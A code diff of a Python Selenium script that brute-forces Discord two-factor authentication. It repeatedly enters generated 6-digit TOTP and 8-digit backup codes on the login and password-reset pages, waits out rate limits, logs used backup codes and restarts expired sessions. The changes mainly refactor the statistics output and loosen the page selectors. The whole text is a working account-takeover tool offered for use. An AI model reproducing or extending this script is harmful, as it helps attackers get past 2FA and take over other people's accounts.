@@ -64,7 +64,10 @@ def TOTP(code):
 	while not stopLoop:
 		# Attempt to find the TOTP login field
 		try:
-			loginTOTP = driver.find_element(by=By.XPATH, value="//*[@aria-label='Enter Discord Auth/Backup Code']")
+			if loginEmail.is_displayed():
+				continue
+			else: 
+				loginTOTP = driver.find_element(by=By.XPATH, value="//input[@type='text']")
 			time.sleep(0.5)
 			start = time.time()
 			sleepy = 0
@@ -77,9 +80,9 @@ def TOTP(code):
 					print("TOTP login field: " + toColor("Found","green"))
 					print("Forcer: " + toColor("Starting","green"))
 
-				# Generate a new 8 or 6 digit code and enter it into the TOTP field
+				# Generate a new 8 or 6 digit code
 				totp = (code[1](1))
-				# Check if 8 digit code has been used before, if true skip and generate new code
+				 # Check if 8 digit code has been used before, if true skip and generate new code
 				if code[1] == genBackup:
 					with open('.codes', 'a+') as f:
 						f.seek(0)
@@ -88,16 +91,19 @@ def TOTP(code):
 							continue 
 						else:
 							f.write(totp + '\n')
+				# Enter code it into the TOTP field							
 				loginTOTP.send_keys(totp)
 				loginTOTP.send_keys(Keys.RETURN)
 				totpCount += 1
 				time.sleep(0.6)
+
 
 				#Test for ratelimit
 				if ("The resource is being rate limited." in driver.page_source):
 					sleepy = secrets.choice(range(10, 15))
 					ratelimitCount += 1
 					print("Code: " + toColor(totp, "blue") + " was " + toColor("Ratelimited", "yellow") + ", will retry in " + toColor(sleepy, "blue"))
+					# Wait for delay and retry code
 					time.sleep(sleepy)
 					loginTOTP.send_keys(Keys.RETURN)
 					sleepy = secrets.choice(range(6, 10))
@@ -106,10 +112,9 @@ def TOTP(code):
 				elif ("Token has expired" in driver.page_source): 
 					#  Print this out as well as some statistics, and prompt the user to retry.
 					elapsed = time.time() - start
-					print(toColor("Invalid session ticket.", "red"))
-					print(toColor(f"Number of tried codes: {totpCount}", "blue"))
-					print(toColor(f"Time elapsed for codes: {elapsed}", "blue"))
-					print(toColor(f"Number of ratelimits {ratelimitCount}", "blue"))
+					print(toColor("Token has expired.", "red"))
+					stats = [totpCount, elapsed, ratelimitCount]
+					inform(stats)
 					# Close the browser.
 					driver.close()
 				
@@ -118,9 +123,8 @@ def TOTP(code):
 					#  Print this out as well as some statistics, and prompt the user to retry.
 					elapsed = time.time() - start
 					print(toColor("Invalid session ticket.", "red"))
-					print(toColor(f"Number of tried codes: {totpCount}", "blue"))
-					print(toColor(f"Time elapsed for codes: {elapsed}", "blue"))
-					print(toColor(f"Number of ratelimits {ratelimitCount}", "blue"))
+					stats = [totpCount, elapsed, ratelimitCount]
+					inform(stats)
 					# Close the browser, wait 1 second and reopen.
 					driver.close()
 					time.sleep(1)
@@ -191,7 +195,7 @@ def PR(code):
 	while not stopLoop:
 		# Attempt to find the TOTP login field
 		try:
-			resetTOTP = driver.find_element(by=By.XPATH, value="//*[@placeholder='6-digit authentication code/8-digit backup code']")
+			resetTOTP = driver.find_element(by=By.XPATH, value="//input[@type='text']")
 			time.sleep(0.5)
 			start = time.time()
 			sleepy = 0
@@ -204,9 +208,9 @@ def PR(code):
 					print("TOTP login field: " + toColor("Found","green"))
 					print("Forcer: " + toColor("Starting","green"))
 
-				# Generate a new 8 or 6 digit code and enter it into the TOTP field
+				# Generate a new 8 or 6 digit code
 				totp = (code[1](1))
-				# Check if 8 digit code has been used before, if true skip and generate new code
+				 # Check if 8 digit code has been used before, if true skip and generate new code
 				if code[1] == genBackup:
 					with open('.codes', 'a+') as f:
 						f.seek(0)
@@ -215,6 +219,7 @@ def PR(code):
 							continue 
 						else:
 							f.write(totp + '\n')
+				# Enter code it into the TOTP field							
 				resetTOTP.send_keys(totp)
 				resetTOTP.send_keys(Keys.RETURN)
 				totpCount += 1
@@ -234,26 +239,23 @@ def PR(code):
 				elif ("Token has expired" in driver.page_source): 
 					#  Print this out as well as some statistics, and prompt the user to retry.
 					elapsed = time.time() - start
-					print(toColor("Invalid session ticket.", "red"))
-					print(toColor(f"Number of tried codes: {totpCount}", "blue"))
-					print(toColor(f"Time elapsed for codes: {elapsed}", "blue"))
-					print(toColor(f"Number of ratelimits {ratelimitCount}", "blue"))
+					print(toColor("Token has expired.", "red"))
+					stats = [totpCount, elapsed, ratelimitCount]
+					inform(stats)
 					# Close the browser.
 					driver.close()
 				
 				elif ("Invalid two-factor auth ticket" in driver.page_source):
 					# This means that Discord has expired this login session.
-					#  Print this out as well as some statistics, and prompt the user to retry.
+					# Print this out as well as some statistics, and prompt the user to retry.
 					elapsed = time.time() - start
 					print(toColor("Invalid session ticket.", "red"))
-					print(toColor(f"Number of tried codes: {totpCount}", "blue"))
-					print(toColor(f"Time elapsed for codes: {elapsed}", "blue"))
-					print(toColor(f"Number of ratelimits {ratelimitCount}", "blue"))
+					stats = [totpCount, elapsed, ratelimitCount]
+					inform(stats)
 					# Close the browser, wait 1 second and reopen.
 					driver.close()
 					time.sleep(1)
 					PR(code)
-
 				# The entered TOTP code is invalid. Wait 6-10 seconds, then try again.
 				else:
 					sleepy = secrets.choice(range(6, 10))
@@ -278,6 +280,15 @@ def PR(code):
 				# If the TOTP login field is not found (e.g the user hasn't completed the Captcha/entered a new password, then try again
 		except (NoSuchElementException):
 			pass
+
+def inform(stats):
+	# Print the number of tried codes.
+	print("Number of tried codes: " + toColor(stats[0], "blue"))
+	# Print the time elapsed for codes.
+	print("Time elapsed for codes: " + toColor(stats[1], "blue"))
+	# Print the number of ratelimits.
+	print("Number of ratelimits: " + toColor(stats[2], "blue"))
+	pass
 
 if __name__ == "__main__":
 	# Set variable for code menu
@@ -315,4 +326,3 @@ if __name__ == "__main__":
 			TOTP(code)	
 		case _:
 			print("Invalid option entered!")
-
